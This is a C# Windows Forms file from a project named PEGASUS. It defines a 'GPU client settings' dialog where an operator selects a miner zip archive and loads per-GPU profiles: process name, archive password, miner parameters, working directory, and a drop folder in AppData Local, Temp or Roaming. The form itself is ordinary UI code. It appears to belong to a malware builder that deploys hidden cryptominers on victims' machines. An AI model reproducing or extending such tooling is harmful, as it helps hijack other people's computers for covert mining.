using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class GPUClientSettings : Form
    {
        public bool IsOK = false;
        public string filePatchbin = "";

        public GPUClientSettings()
        {
            InitializeComponent();
        }

        private void metroSetButton1_Click(object sender, EventArgs e)
        {
            IsOK = false;
            Hide();
        }

        private void metroSetButton3_Click(object sender, EventArgs e)
        {
            try
            {
                if (!File.Exists(metroSetButton2.Tag.ToString()))
                    MessageBox.Show("Miner archive not found ");
                else
                    Hide();
            }
            catch
            {
            }
        }

        private void metroSetButton2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                O.Filter = "(*.zip)|*.zip";
                if (O.ShowDialog() == DialogResult.OK)
                {
                    filePatchbin = Path.GetFullPath(O.FileName);
                    metroSetButton2.Text = filePatchbin;
                    metroSetButton2.Tag = O.FileName;
                    IsOK = true;
                }
                else
                {
                    IsOK = true;
                }
            }
        }





        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void metroSetRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            // Load GPU miner settings from 6GB
            metroSetTextBox4.Text = Properties.Settings.Default.gpu6_Proc;
            metroSetTextBox1.Text = Properties.Settings.Default.gpu6_zipPassword;
            metroSetTextBox2.Text = Properties.Settings.Default.gpu6_Parametrs;
            metroSetTextBox3.Text = Properties.Settings.Default.gpu6_workDir;

            if (Properties.Settings.Default.gpu6_sysDir == "LOCAL")
                metroSetComboBox1.Text = "C:/Users/AppData/Local";
            else if (Properties.Settings.Default.gpu6_sysDir == "TEMP")
                metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";
            else if (Properties.Settings.Default.gpu6_sysDir == "ROAMING")
                metroSetComboBox1.Text = "C:/Users/AppData/Roaming";

            if (File.Exists(Properties.Settings.Default.gpu6_file))
            {
                metroSetButton2.Text = Properties.Settings.Default.gpu6_file;
                metroSetButton2.Tag = Properties.Settings.Default.gpu6_file;
                IsOK = true;
            }
            else
            {
                metroSetButton2.Text = "Browser";
            }
            metroSetButton2.Refresh();
            this.Refresh();
        }

        private void metroSetRadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            metroSetTextBox4.Text = Properties.Settings.Default.gpu4_Proc;
            metroSetTextBox1.Text = Properties.Settings.Default.gpu4_zipPassword;
            metroSetTextBox2.Text = Properties.Settings.Default.gpu4_Parametrs;
            metroSetTextBox3.Text = Properties.Settings.Default.gpu4_workDir;

            if (Properties.Settings.Default.gpu4_sysDir == "LOCAL")
                metroSetComboBox1.Text = "C:/Users/AppData/Local";
            else if (Properties.Settings.Default.gpu4_sysDir == "TEMP")
                metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";
            else if (Properties.Settings.Default.gpu4_sysDir == "ROAMING")
                metroSetComboBox1.Text = "C:/Users/AppData/Roaming";

            if (File.Exists(Properties.Settings.Default.gpu4_file))
            {
                metroSetButton2.Text = Properties.Settings.Default.gpu4_file;
                metroSetButton2.Tag = Properties.Settings.Default.gpu4_file;
                IsOK = true;
            }
            else
            {
                metroSetButton2.Text = "Browser";
            }

            metroSetButton2.Refresh();
            this.Refresh();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}
